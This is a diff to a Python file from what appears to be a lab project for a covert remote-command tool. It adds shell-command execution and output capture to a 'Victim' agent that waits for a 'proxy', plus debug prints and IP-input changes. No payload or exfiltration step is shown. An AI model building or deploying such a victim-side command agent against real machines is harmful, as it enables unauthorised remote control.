@@ -8,8 +8,7 @@ import random
 import threading
 import sys
 import select  
-import ipaddress
-import time
+import ipaddress 
 
 file_path = "../comunication_methods.py"
 directory = os.path.dirname(file_path)
@@ -19,12 +18,7 @@ import comunication_methods as com
 file_path = "../mymethods.py"
 directory = os.path.dirname(file_path)
 sys.path.insert(0, directory)
-import mymethods  
-
-file_path = "./type_singleton.py"
-directory = os.path.dirname(file_path)
-sys.path.insert(0, directory)
-import type_singleton as singleton
+import mymethods   
 
 file_path = "./attacksingleton.py"
 directory = os.path.dirname(file_path)
@@ -60,7 +54,9 @@ def get_data_from_command(process_shell):
     while there_is_smth_to_read: 
         count+=1
         print(f"lettura dei dati... {count}")
+        print("UUU")
         reads = [process_shell.stderr.fileno(),process_shell.stdout.fileno()] 
+        print("UUU")
         ret = select.select(reads, [], [], 1.0)  # 1s timeout for safety 
         for fd in ret[0]:
             if fd == process_shell.stdout.fileno(): 
@@ -93,6 +89,39 @@ def get_data_from_command(process_shell):
             #print("Process exited but streams may still have data")
     print(f"Command finished with exit code {process_shell.poll()}")
     return data 
+
+def _windows_get_data_from_command(process_shell):
+    data = []
+    while True:
+        line = process_shell.stdout.readline()
+        if not line:
+            break
+        data.append(line.strip())
+    return data
+    #stdout_data, stderr_data = process_shell.communicate()
+    #return stdout_data.splitlines(), stderr_data.splitlines() 
+
+def read_stream(stream, buffer, label=""):
+    for line in iter(stream.readline, ''):
+        if line:
+            decoded = line.rstrip()
+            print(f"{label}: {decoded}")
+            buffer.append(decoded)
+    stream.close()
+
+def general_get_data_from_command(command:str):
+    process=mymethods.get_shellProcess_command([command]) 
+    stdout_lines = []
+    stderr_lines = [] 
+    stdout_thread = threading.Thread(target=read_stream, args=(process.stdout, stdout_lines, "OUT"))
+    stderr_thread = threading.Thread(target=read_stream, args=(process.stderr, stderr_lines, "ERR"))
+
+    stdout_thread.start()
+    stderr_thread.start() 
+    process.wait()
+    stdout_thread.join()
+    stderr_thread.join() 
+    return stdout_lines, stderr_lines
 
 def check_system_compatibility():
     supportedSystems=["linux","win32"] 
@@ -334,8 +363,8 @@ class Victim:
                 else:
                     print(f"Errore nel trovare l'IP locale: {errore}")
                     msg="Inserire indirizzo IP dell'host:\n\t#" 
-                    #self.ip_host=ipaddress.ip_address(input(msg))  
-                    self.ip_host=ipaddress.ip_address("192.168.56.102") #TODO eliminare alla fine
+                    self.ip_host=ipaddress.ip_address(input(msg))  
+                    #self.ip_host=ipaddress.ip_address("192.168.56.102") #TODO eliminare alla fine
                     print("***IP host: ",type(self.ip_host),self.ip_host)
                     break 
             except Exception as e:
@@ -369,9 +398,9 @@ class Victim:
     def wait_conn_from_proxy(self): 
         try:
             #confirm_text=com.CONFIRM_PROXY+self.ip_host.compressed
-            #checksum=mymethods.calc_checksum(confirm_text.encode()) 
-            self.event_enough_proxy=com.get_threading_Event()  
-            interface=mymethods.default_iface()  
+            #checksum=mymethods.calc_checksum(confirm_text.encode())  
+            self.event_enough_proxy=com.get_threading_Event()   
+            interface=mymethods.default_iface()   
             filter=attacksingleton.get_filter_connection_from_function(
                 "victim_wait_conn_from_proxy" 
                 ,ip_dst=self.ip_host
